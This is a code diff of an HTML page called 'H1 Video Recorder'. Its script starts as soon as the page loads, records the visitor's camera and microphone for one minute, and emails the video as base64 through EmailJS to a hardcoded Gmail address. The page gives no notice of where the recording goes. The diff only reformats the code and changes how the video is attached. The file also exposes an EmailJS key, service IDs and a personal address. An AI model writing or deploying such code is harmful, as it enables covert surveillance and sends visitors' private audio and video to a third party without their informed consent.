@@ -6,61 +6,56 @@
   <title>H1 Video Recorder</title>
 </head>
 <body>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    // Initialize EmailJS with your public key
-    emailjs.init("ACOn6PC1Zb70JrmxT");
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  // Initialize EmailJS with your public key
+  emailjs.init("ACOn6PC1Zb70JrmxT");
 
-    async function startRecording() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+  async function startRecording() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
+      const recorder = new MediaRecorder(stream);
+      const chunks = [];
 
-        recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.ondataavailable = e => chunks.push(e.data);
 
-        recorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          const reader = new FileReader();
+      recorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const reader = new FileReader();
 
-          reader.onloadend = function() {
-            // Convert to base64 (remove data prefix)
-            const base64data = reader.result.split(',')[1];
+        reader.onloadend = function() {
+          // Convert blob to base64 string, remove prefix (data:*/*;base64,)
+          const base64data = reader.result.split(',')[1];
 
-            // Send email with attachment
-            emailjs.send("service_khmk344", "template_oyrsayr", {
-              to_email: "julianlee252@gmail.com",
-              message: "Here’s your 1-minute video recording."
-            }, {
-              attachments: [{
-                name: "recording.webm",
-                data: base64data
-              }]
-            }).then(() => {
-              // Email sent successfully
-              // You can add something here if you want
-            }).catch(error => {
-              console.error("❌ EmailJS error:", error);
-            });
-          };
-
-          reader.readAsDataURL(blob);
+          // Send email with base64 video in the message variable
+          emailjs.send("service_khmk344", "template_oyrsayr", {
+            to_email: "julianlee252@gmail.com", // if your template uses this variable
+            message: base64data
+          }).then(() => {
+            console.log("✅ Email sent successfully");
+          }).catch(error => {
+            console.error("❌ EmailJS error:", error);
+          });
         };
 
-        recorder.start();
+        reader.readAsDataURL(blob);
+      };
 
-        setTimeout(() => {
-          recorder.stop();
-          stream.getTracks().forEach(track => track.stop());
-        }, 60000); // 1 minute
+      recorder.start();
 
-      } catch (err) {
-        console.error("Permission denied or error:", err);
-      }
+      // Stop recording after 60 seconds
+      setTimeout(() => {
+        recorder.stop();
+        stream.getTracks().forEach(track => track.stop());
+      }, 60000);
+
+    } catch (err) {
+      console.error("Permission denied or error:", err);
     }
+  }
 
-    window.onload = startRecording;
-  </script>
+  window.onload = startRecording;
+</script>
 </body>
 </html>
